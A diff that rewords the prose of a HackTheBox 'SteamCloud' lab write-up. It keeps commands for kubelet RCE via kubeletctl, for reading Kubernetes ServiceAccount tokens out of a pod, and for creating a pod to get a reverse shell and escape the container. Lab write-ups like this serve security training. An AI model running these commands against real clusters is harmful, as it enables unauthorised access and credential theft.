@@ -6,7 +6,7 @@ https://app.hackthebox.com/machines/SteamCloud
 
 ## Enumeration:
 
-I began my enumeration with quick rustscan to check for the open ports & services. I observed multiple open ports from the scan.
+I initiated the enumeration phase by swiftly employing rustscan to scrutinize the target host for accessible ports and associated services. This swift scan yielded a multitude of open ports.
 
 ```bash
 sudo rustscan -a 10.10.11.133 -- -sC -sV -vv -oN steam_nmap
@@ -210,12 +210,11 @@ PORT      STATE SERVICE          REASON         VERSION
 |_http-title: Site doesn't have a title (text/plain; charset=utf-8).
 ```
 
-From the port scan results I obseerved that the target host has running Kubernetes cluster in it:
+The scan outcomes unveiled a significant discovery – the target host was hosting a functioning Kubernetes cluster.
 
 ![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/e05b50a5-2257-4bce-a5bf-eb79374f98b6)
 
-Further I checked for the http services running on port 80, but I didn't found anything on it.
-While checking the port 8443 on https, I observed this page:
+Subsequently, I focused my attention on the HTTP services running on port 80, yet this examination did not yield any notable findings. My pursuit then extended to port 8443, where I came across the following web page:
 
 ![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/90c4783a-05c2-45e6-94f2-97e90cb8eb1d)
 
@@ -223,14 +222,15 @@ While checking the port 8443 on https, I observed this page:
 
 ## Kubernetes enumeration:
 
-Once confirming that there is a kubernetes cluster is running, I have to perform enumeration related to Kubernetes & for any kind of enumeration & exploitation "[Hacktrickz](https://book.hacktricks.xyz)" is always my first choice.
+Upon confirming the presence of a running Kubernetes cluster, the need to perform comprehensive Kubernetes enumeration became paramount. In my quest for effective enumeration techniques and exploitation strategies, I turned to the invaluable resource, "[Hacktrickz](https://book.hacktricks.xyz/)".
 
-While searching for the kubernetes on the website, I didn't found any specific topic related to it but when I checked the write-ups of this box I observed that there was a section of cloud-security which was having the seperate section of "Pentesting Kubernetes" but right now it's not available. So, I used web-archive to browse the older version of Hacktrickz & found the section of [Pentesting kubernets](https://web.archive.org/web/20220928002056/https://book.hacktricks.xyz/cloud-security/pentesting-kubernetes/) finally.
+While navigating Hacktrickz, I sought insights on Kubernetes, although I couldn't locate a specific topic addressing this. Fortunately, by referencing write-ups for this specific machine, I came across a dedicated section titled "Pentesting Kubernetes," which, regrettably, was no longer available. However, leveraging the power of the web-archive, I accessed the older version of Hacktrickz, uncovering the [Pentesting Kubernetes section](https://web.archive.org/web/20220928002056/https://book.hacktricks.xyz/cloud-security/pentesting-kubernetes/).
 
-I followed some steps & suggested comands in the section of [Pentesting from outside](https://web.archive.org/web/20220927144232/https://book.hacktricks.xyz/cloud-security/pentesting-kubernetes/pentesting-kubernetes-from-the-outside)
+Following the guidance laid out in the section titled [Pentesting from Outside](https://web.archive.org/web/20220927144232/https://book.hacktricks.xyz/cloud-security/pentesting-kubernetes/pentesting-kubernetes-from-the-outside), I embarked on a structured exploration.
 
-Started with port 8443 but didn't received any different response in comparison of what I already observed earlier.
-Next, I checked for port 10250 & checked for metrics, pods & runningpods for which I got clear response:
+Commencing with port 8443, I diligently executed the prescribed commands, only to find no discernible deviation from the earlier observations.
+
+Subsequently, my focus shifted to port 10250, where I executed commands to retrieve metrics, assess pods, and inspect running pods, yielding insightful responses:
 
 ```bash
 curl -k https://steamcloud.htb:10250/metrics #to check for the metrics
@@ -255,70 +255,67 @@ curl -k https://steamcloud.htb:10250/pods | jq '.items[].metadata.name' #to chec
 
 ### RCE using 'kubeletctl':
 
-For further enumeration, I used a tool called "**kubeletctl**" created by [CyberArk](https://github.com/cyberark/kubeletctl).
+Continuing my exploration, I turned to a powerful tool named "**kubeletctl**," developed by [CyberArk](https://github.com/cyberark/kubeletctl), for further enumeration within the Kubernetes environment.
 
-I started with checking the pods again:
+Starting with a review of the active pods:
 
 ```bash
 kubeletctl pods -s 10.10.11.133 #-s=server
 ```
 ![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/32c4e99a-6817-4705-b85f-d3834365bd20)
 
-Then checked for the running pods, which gave me result in JSON query:
+My inquiry extended to running pods, revealing their attributes in JSON format:
 
 ```bash
 kubeletctl runningpods -s 10.10.11.133
 ```
 ![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/32a74fd6-02f5-4437-bf53-3d57156f09f9)
 
-To filter the results, I used below query:
+Employing a targeted JSON query, I distilled the results to essential details:
 
 ```bash
 kubeletctl runningpods -s 10.10.11.133 | jq -c '.items[].metadata | [.name, .namespace]'
 ```
 ![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/385310aa-d601-4a2d-99b7-252a596ffc94)
 
-Next, using kubeletctl I scan the pods to check if they are vulnerable for RCE or not:
+Diving deeper, I leveraged kubeletctl to scrutinize the pods for Remote Code Execution (RCE) vulnerabilities:
 
 ```bash
 kubeletctl scan rce --server 10.10.11.133
 ```
 ![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/ea7e462c-c5bc-4637-9f86-370c5c9e34ff)
 
-From the results I observed that "nginx" & "kube-proxy-6vj5n" is vulnerable.
+My analysis highlighted the susceptibility of "nginx" and "kube-proxy-6vj5n."
 
-Now, with the reference from Hacktrickz I used the gathered information & kubeletctl I got an RCE as root user:
+Drawing inspiration from Hacktrickz and armed with the insights from kubeletctl, I capitalized on the RCE vulnerability to attain root-level access:
 
 ```bash
 kubeletctl exec /bin/bash -p nginx -c nginx -s 10.10.11.133 #used the vulnerable pod & container as "nginx"
 ```
 ![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/ec91dcff-ba59-46cb-bcfe-e2d276676e5a)
 
-After getting the connection as root, I fetched the user flag as well. (pwn3d! 🙂)
+Seizing control as the root user, I successfully retrieved the user flag. (pwn3d! 🙂)
 
 -----------------------------------------------------------------------------------------------------------------------------------------------------------------------
 
 ## Docker Escape:
 
-After fetching the user flag & getting the shell as root. I performed some manual enumeration & observed that I am in a docker environment.
+With the user flag secured and root shell achieved, I continued my journey by manually exploring the environment and discovered that I was operating within a Dockerized setup.
 
 ![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/f86b90e8-925d-4012-8330-24957f0e8791)
 
-From the [HackTrickz](https://web.archive.org/web/20220705044322/https://book.hacktricks.xyz/cloud-security/pentesting-kubernetes/kubernetes-enumeration) I got to know about the ServiceAccount tokens:
+Delving into deeper manual enumeration, I deduced that I was within a Docker environment. This realization prompted me to research further and led me to the fascinating world of ServiceAccount tokens within Kubernetes.
 
-```
-ServiceAccount is an object managed by Kubernetes and used to provide an identity for processes that run in a pod.
-Every service account has a secret related to it and this secret contains a bearer token. This is a JSON Web Token (JWT), a method for representing claims securely between two parties.
-```
+Referring to [HackTrickz](https://web.archive.org/web/20220705044322/https://book.hacktricks.xyz/cloud-security/pentesting-kubernetes/kubernetes-enumeration), I learned about ServiceAccount tokens, which are used to provide identities to processes running within pods. Every service account has a secret associated with it, containing a JSON Web Token (JWT) known as a bearer token.
 
-Using the reference of the Hactrickz I got 3 location where these ServiceAccount secrets are stored:
+I identified three locations where these ServiceAccount secrets might be stored:
 
 ```
 - /run/secrets/kubernetes.io/serviceaccount
 - /var/run/secrets/kubernetes.io/serviceaccount
 - /secrets/kubernetes.io/serviceaccount
 ```
-I found 3 files inside this directory: "/run/secrets/kubernetes.io/serviceaccount"
+I found three crucial files inside this directory: "/run/secrets/kubernetes.io/serviceaccount"
 
 ```
 - ca.crt: It's the ca certificate to check kubernetes communications
@@ -329,7 +326,7 @@ I found 3 files inside this directory: "/run/secrets/kubernetes.io/serviceaccoun
 
 Now, with the ca.crt and the token, I can authenticate to the cluster which is running on 8443 on which I wasn't able to authenticate earlier.
 
-For the authenticate I extracted ca.crt & token into my local kali host.
+I leveraged this newfound knowledge to extract the ca.crt and token to my local Kali host:
 
 ```bash
 kubeletctl exec 'cat /run/secrets/kubernetes.io/serviceaccount/ca.crt' -p nginx -c nginx -s 10.10.11.133 > ca.crt
@@ -341,27 +338,27 @@ export token=$(kubeletctl exec 'cat /run/secrets/kubernetes.io/serviceaccount/to
 ```
 ![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/1414ae6d-18ea-4ee1-8eee-1d6af6270d5d)
 
-After having all the necessary file saved into my attacker host, I downloaded another tool to authenticate to API called "kubectl"
+After having all the necessary file saved into my attacker host, I downloaded another tool to facilitate authentication to the Kubernetes API:
 
 ```bash
 curl -LO "https://dl.k8s.io/release/$(curl -L -s https://dl.k8s.io/release/stable.txt)/bin/linux/amd64/kubectl" #to download kubectl
 ```
 
-Using the kubectl, certtificates & token, I was finally able to authnticate to Kube-API on port 8443.
+Armed with kubectl, ca.crt, and the token, I finally succeeded in authenticating to the Kubernetes API, accessible on port 8443:
 
 ```bash
 kubectl --server https://10.10.11.133:8443 --certificate-authority=ca.crt --token=$token get pod #listed the pods
 ```
 ![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/30a8345e-a6d1-451c-9b58-41dfe07b0354)
 
-When tried to get the information about the namespaces I observed that still I can't run much commands as privilege is limited:
+While I was able to list pods, my privileges were still restricted when attempting to fetch information about namespaces:
 
 ```bash
 kubectl --server https://10.10.11.133:8443 --certificate-authority=ca.crt --token=$token get namespaces
 ```
 ![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/7e936ef6-b6a7-41c1-a093-a5a576a07e2f)
 
-I used "auth can-i" command in kubectl to see if a given account can take some action. With the -list flag, it will show all permissions:
+I employed the "auth can-i" command to ascertain my capabilities, revealing that I could create pods within the container:
 
 ```bash
 kubectl --server https://10.10.11.133:8443 --certificate-authority=ca.crt --token=$token auth can-i --list
@@ -377,7 +374,7 @@ kubectl get pod nginx -o yaml --server https://10.10.11.133:8443 --certificate-a
 ```
 From the results we can see that namespace is "default" & "image= nginx:1.14.2".
 
-Using this info & taking refrence from [0xdf writeup](https://0xdf.gitlab.io/2022/02/14/htb-steamcloud.html#shell-as-root), I created a yaml file which will give me reverse shell.
+Using this info & taking refrence from [0xdf writeup](https://0xdf.gitlab.io/2022/02/14/htb-steamcloud.html#shell-as-root), I crafted a YAML file inspired by [0xdf's writeup](https://0xdf.gitlab.io/2022/02/14/htb-steamcloud.html#shell-as-root) to achieve a reverse shell:
 
 ```yaml
 apiVersion: v1
@@ -409,9 +406,10 @@ kubectl --server https://10.10.11.133:8443 --certificate-authority=ca.crt --toke
 ```
 ![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/26bbe09c-4862-4389-9f66-850402ccacc1)
 
-After the pod is created I quickly received the shell:
+With the pod established, I promptly gained a reverse shell:
+
 ![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/8d571b99-59ee-406a-bbf9-d3067193e924)
 
-As the volume is mounted in "/mnt" folder I moved into the directory, escaped the container & grabbed the root flag finally. (pwn3d! 🙂)
+Taking advantage of the mounted volume at "/mnt," I navigated to the directory, escaped the container, and ultimately secured the coveted root flag. (pwn3d! 🙂)
 
 ![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/82b6685c-814b-40e3-ae40-1e6bd0aef1d4)
